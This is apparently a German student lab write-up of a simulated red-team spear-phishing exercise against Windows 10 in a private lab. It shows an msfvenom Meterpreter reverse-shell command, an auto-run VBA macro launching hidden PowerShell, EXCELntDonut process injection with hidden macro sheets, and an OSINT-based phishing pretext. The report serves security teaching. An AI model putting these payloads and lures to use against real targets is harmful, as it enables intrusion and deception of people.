# Whitehat Hacking 3


## Aufgabe 1 

Als Sie in der Früh ins Büro kommen ersucht Sie Ihre Kollegin Beate gleich ins Besprechungszimmer zu kommen. Dort erfahren Sie, dass die Forensik Abteilung bei Ihrer Untersuchung eines Sicherheitsvorfalls bei einem Ihrer wichtigsten Kunden festgestellt hat, dass die bislang unbekannte APT Gruppe „No Regerts“ offenbar über einen Social Engineering Angriff Zugriff auf das System erhielt. Der Kunde hat daraufhin sofort Ihr Red Team beauftragt die User Awareness und Sicherheit im Hinblick auf Social Engineering Angriffe und die vorhandenen Gegenmaßnahmen zu testen. Das Ziel des Red Teams ist es eine mehrstufige, möglichst ausgeklügelte und überzeugende Spear Phishing Kampagne auf Executive Mitarbeiter zu starten. Das Ziel gilt als erreicht, sobald es dem Team gelingt eine Bind Shell auf einem full patched Windows 10 Rechner mit eingeschaltetem AMSI zu starten und sich damit zu verbinden. 

### Interpretation der Aufgabenstellung  

Erstellen eines Office Dokuments mit eingebetteten Macro, welches einen Tunnel zum System des "Hackers" aufbaut. Das Dokument muss eine "glaubhafte" Geschichte erzaehlen.

### Setup

Es werden eine Kali 20.04 VM und eine Windows 10 x32 basierend auf einer KVM Umgebung verwendet.


### Erste Versuche

Der erste Versuch war die Erstellung eines Word Dokuments vom Typ "docm", welches Makros beinhalten kann. Diesem wird eine mit dem Venom Plugin des Metasploit-Frameworks erstellt. Folgende Befehle wurden im ersten Versuch benutzt:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.224 LPORT=1337 -e x86/shikata_ga_nai -f vba-psh > macro.txt

Dabei hat der Windows defender hier seine Arbeit sehr gut gemacht und das Makro sofort beim Speichern als Schadhaft erkannt.

![firstFail](ue1/pics/firstTryDefender.png)

Anscheinend muss die Payload hier besser codiert werden. Um die Payload besser zu verstehen und etwas tiefer in die Materie einzusteigen wurden der obige Befehl ohne die Encryption erstellt um die Funktionen lesen zu koennen.


    Sub rIriDKgfEv()
      Dim e6anPeao
      e6anPeao = "powershell.exe -nop -w hidden -e <encrypted payload for opening a reverse tunnel to the LHOST"
     Call Shell(e6anPeao, vbHide)
    End Sub
    Sub AutoOpen()
      rIriDKgfEv
    End Sub
    Sub Workbook_Open()
      rIriDKgfEv
    End Sub

Hier faellt sofort auf, dass "Workbook_Open()" nicht in Word implementiert ist. 

### Undokumentiertes Innuendo

Die Methode der aus der Volesung wird anscheinend vom Windows Defender sofort erkannt.

### Versuch mit Excel

Der Plan ist mit dem Tool "EXCELentDonut" [^1] eine hidden Payload in Excel zu verpacken. Diese Payload ist eine mit MSFVENOM generierte Payload, welches in dem von EXCELentDonut mitgeliefertem Template eingefuegt wurde.

[^1]: https://github.com/FortyNorthSecurity/EXCELntDonut

Das Template verwendet Process Injection um die Payload auszufuehren.

![excelPayload](ue1/pics/excelPayload.png)

Nun wird der von dem Tool erstellte Text in die Zwischenablage kopiert und ueber einen Rechtsclick in einem Excel Workbook auf dem Zielsystem auf "Sheet1" der Text als Macro eingefuegt.


![createMacro](ue1/pics/insertMacro.png)

Auf der Angreifermaschine wurde die Meterpretersession gestartet und als erster Test das Makro auf dem Zielrechner ausgefuehrt.

Nachdem der Fehler mit der Payload fuer die Falsche Architektur (x64 vs x86) behoben wurde, startete das Makro auch sofort die Meterpreter session.


![testErfolg](ue1/pics/meterpreterTestOpen.png)

![testIP](ue1/pics/meterpreterTestIP.png)

### Making it Stealthy

Da wir nun Wissen, dass unsere Prosess Injcetion funktioniert, muessen wir nun das Excel Wokrbookt "herrichten"

Als ersters wird die Zelle A1 im Macro Sheet auf "AutoOpen" umbenannt. Das hat den gleichen Effekt wie eine AutoOpen Funktion in VBA-Macros und so wird unsere Routine beim Start ausgefuehrt. Anschliesend "Verstecken" wir das Makro Worksheet und fuellen das Sichtbare Worksheet mit Dummydaten, welche zu unserer Geschichte Passen. Es sei zu erwaehnen, dass es in Excel fuer ein Worksheet den Status "hidden" und "very hidden" geben kann. Der hidden-Status kann ueber die GUI erreicht werden, wohingegen "very hidden" nur durch aendern eines bestimmten Bytes mittels einens Hex-Editors erzielt wird.

Da dies eine Spear-Phishing Kampagne simuliert, wird hier davon ausgegangen, dass durch OSINT-Methoden Informationen ueber das Berufs- und Privatleben der Zielperson erlangt worden sind.

Laut LinkedIn und einigen Posts auf Social Media ist die Zielperson daran sich mit einem Berufsbegleitendem Studium am Technikum Wien Ihr Wissen zu erweitern. Daher wird auf die Zielperson angepasst eine Phishing-Mail mit dem Titel: " Streng Vertraulich: Jaehrliche Abrechnung zum Unkostenbeitrag" geschickt, welche das zuvor praeparierte Excel File angehaengt hat.

Das Ziel bekommt nun folgende OBerflaeche nach dem Oeffnen des Documents.

![ENABLE](ue1/pics/enableContent.png)

Die Zielperson muss im Body der Mail auf ein (in unserem Fall nicht vorhandenes) Macro Hingewiesen werden, welches weitere Inhalte Freischaltet. Man kann hier noch ein legitimes Makro zusaetzlich einbauen, um das Excel-File noch unauffaelliger wirken zu lassen. Fuer unseren Fall haben wir ab dem Click auf den "Enable Content" Button schon gewonnen. Weiters ist unten zu sehen, dass das Makro Sheet nicht sichtbar ist. Dies koennte jedoch mit einem Rechtsclick auf Sheet1 wieder eingeblendet werden. (Was mit dem oben erwaehnten "very hidden" nicht der Fall waere)

Nach dem Oeffnen und dem Content Enablen erhalten wir die 2. Session. Die erste ist nicht mehr aktiv, da inzwischen neu gestartet wurde.


![works1](ue1/pics/works-final.png)